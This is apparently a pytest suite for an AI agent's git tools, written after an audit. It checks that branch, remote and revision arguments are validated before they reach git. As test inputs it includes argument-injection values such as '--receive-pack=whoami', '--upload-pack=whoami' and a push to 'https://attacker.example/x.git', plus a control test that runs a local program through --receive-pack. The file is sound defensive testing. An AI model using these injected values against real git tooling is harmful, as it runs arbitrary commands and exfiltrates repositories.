"""Every branch, remote and revision a git tool passes to git is checked first.

2026-11-10 audit: ``git_push``, ``git_checkout`` and ``git_merge`` put their
``branch`` / ``source_branch`` / ``remote`` into git's argv as given.
``git_push(branch="--receive-pack=<cmd>", remote=".")`` ran ``<cmd>`` on this
machine (git starts the receive-pack program for a local push), and
``remote="https://attacker/x.git"`` pushed the repository to any host: git
takes a URL where a remote name goes. Only ``git_diff`` refused a leading
"-". Now one validator (``tools._checked_ref``; ``_checked_revision`` for
git_diff's ``~``/``^`` and ranges) checks each, a remote must be one the
repository has, and "--" ends the options before positional refs.
"""

from __future__ import annotations

import ast
import asyncio
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from kazma_core.agent.tool_refusal import RefusedBeforeEffect
from kazma_skills.native.git_github_manager import tools as git_tools

GIT = shutil.which("git")
TOOLS_SOURCE = Path(git_tools.__file__)
#: Parameter names that reach git as a ref, a revision or a remote.
REF_PARAMS = frozenset({
    "branch", "remote", "source_branch", "target", "ref", "rev", "tag",
    "base", "head", "upstream", "start_point",
})
VALIDATORS = frozenset({"_checked_ref", "_checked_revision"})
RUNNERS = frozenset({"run_off_loop", "_git_read"})


def _git(repo: Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [GIT, "-c", "core.fsmonitor=false", "-c", "user.name=T",
         "-c", "user.email=t@example.invalid", *args],
        cwd=repo, capture_output=True, text=True, check=False,
    )


@pytest.fixture
def repo(tmp_path, monkeypatch) -> Path:
    if GIT is None:
        pytest.skip("git is not installed")
    work = tmp_path / "work"
    work.mkdir()
    _git(work, "init", "-q", "-b", "main")
    (work / "a.txt").write_text("a\n", encoding="utf-8")
    _git(work, "add", ".")
    _git(work, "commit", "-q", "-m", "first")
    monkeypatch.setattr(git_tools, "_get_workspace", lambda: str(work))
    return work


@pytest.fixture
def recorded(monkeypatch):
    """git_push with a token and a recorder for every command it would run."""
    from kazma_core import git_identity

    monkeypatch.setattr(git_identity, "get_app_installation_token", lambda: "ghs_fake")
    monkeypatch.setattr(git_tools, "_get_workspace", lambda: "/tmp/never")
    calls: list[list[str]] = []

    async def run(argv, **_kwargs):
        calls.append(list(argv))
        # No remote of that name: `git config --get remote.<x>.url` is empty.
        return subprocess.CompletedProcess(argv, 1 if "config" in argv else 0, "", "")

    monkeypatch.setattr(git_tools, "run_off_loop", run)
    return calls


@pytest.mark.parametrize(
    "branch,remote",
    [
        ("--receive-pack=whoami", "."),
        ("main", "."),
        ("main", "https://attacker.example/x.git"),
        ("main", "--upload-pack=whoami"),
        ("-f", "origin"),
        ("main..other", "origin"),
        ("main.lock", "origin"),
    ],
)
async def test_git_push_refuses_before_running_anything(recorded, branch, remote):
    with pytest.raises(RefusedBeforeEffect):
        await git_tools.git_push(branch=branch, remote=remote)
    assert recorded == []


async def test_a_remote_the_repository_lacks_is_refused_before_the_push(recorded):
    with pytest.raises(RefusedBeforeEffect) as refused:
        await git_tools.git_push(branch="main", remote="evil")
    assert "not a remote" in str(refused.value)
    assert not any("push" in argv for argv in recorded), recorded


@pytest.mark.parametrize("bad", ["--orphan=x", "-f", "--", "../x", "a..b", "x.lock", ""])
async def test_checkout_and_merge_refuse_an_option_or_odd_name(repo, bad):
    with pytest.raises(RefusedBeforeEffect):
        await git_tools.git_checkout(bad)
    with pytest.raises(RefusedBeforeEffect):
        await git_tools.git_merge(bad)


async def test_ordinary_branches_still_work(repo):
    out = await git_tools.git_checkout("feature/x-1", create=True)
    assert _git(repo, "branch", "--show-current").stdout.strip() == "feature/x-1", out
    (repo / "b.txt").write_text("b\n", encoding="utf-8")
    _git(repo, "add", ".")
    _git(repo, "commit", "-q", "-m", "second")
    await git_tools.git_checkout("main")
    await git_tools.git_merge("feature/x-1")
    assert (repo / "b.txt").exists()


def test_git_diff_takes_revisions_and_ranges_only(repo):
    for good in ("HEAD", "HEAD~1", "HEAD^", "main..HEAD", "main...HEAD", "v1.0"):
        assert git_tools._checked_revision(good) == good
    for bad in ("--output=x", "-p", "HEAD..--x", "a..b..c", "x.lock"):
        assert asyncio.run(git_tools.git_diff(target=bad)).startswith("Error:"), bad


# ── Gate: a ref parameter that reaches a git command is checked first ───────

def _unchecked_ref_params(source: str) -> list[str]:
    """Functions that run a command and use a ref-like parameter unchecked."""
    def called(call: ast.Call) -> str:
        func = call.func
        return func.id if isinstance(func, ast.Name) else getattr(func, "attr", "")

    found: list[str] = []
    # Module-level functions: the tools and their helpers. A nested function
    # takes values its enclosing tool already built or checked.
    for node in ast.parse(source).body:
        if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        calls = [n for n in ast.walk(node) if isinstance(n, ast.Call)]
        if not {called(c) for c in calls} & RUNNERS:
            continue
        # A parameter is checked when a validator's first argument names it
        # (``_checked_ref(remote or "origin", ...)`` counts).
        checked = {
            name.id
            for c in calls
            if called(c) in VALIDATORS and c.args
            for name in ast.walk(c.args[0])
            if isinstance(name, ast.Name)
        }
        params = [a.arg for a in (*node.args.args, *node.args.kwonlyargs)]
        for name in params:
            if name in REF_PARAMS and name not in checked:
                found.append(f"{node.name}({name})")
    return found


def test_every_ref_parameter_that_reaches_git_is_checked():
    assert _unchecked_ref_params(TOOLS_SOURCE.read_text(encoding="utf-8")) == []


def test_gate_control_a_planted_unchecked_branch_is_found():
    planted = (
        "async def git_rebase_onto(branch: str, remote: str = 'origin'):\n"
        "    remote = _checked_ref(remote)\n"
        "    await run_off_loop(['git', 'rebase', branch])\n"
    )
    assert _unchecked_ref_params(planted) == ["git_rebase_onto(branch)"]


def test_control_the_old_push_argv_runs_a_local_program(repo, tmp_path):
    """The old git_push built ``git push --set-upstream <remote> <branch>``
    (no upstream yet) from the arguments as given; with remote "." and that
    branch, git starts the named program here. The repository chooses
    ``push.default`` (its own configuration)."""
    marker = tmp_path / "pushed-ran.txt"
    helper = tmp_path / "rp.py"
    helper.write_text(f"open({str(marker)!r}, 'w').write('ran')\n", encoding="utf-8")
    _git(repo, "config", "push.default", "current")
    branch = f"--receive-pack={Path(sys.executable).as_posix()} {helper.as_posix()}"
    subprocess.run([GIT, "-c", "credential.helper=", "push", "--set-upstream", ".", branch],
                   cwd=repo, capture_output=True, text=True, timeout=60, check=False)
    assert marker.exists(), "git no longer runs --receive-pack locally: this proves nothing"
    with pytest.raises(RefusedBeforeEffect):
        git_tools._checked_ref(branch)
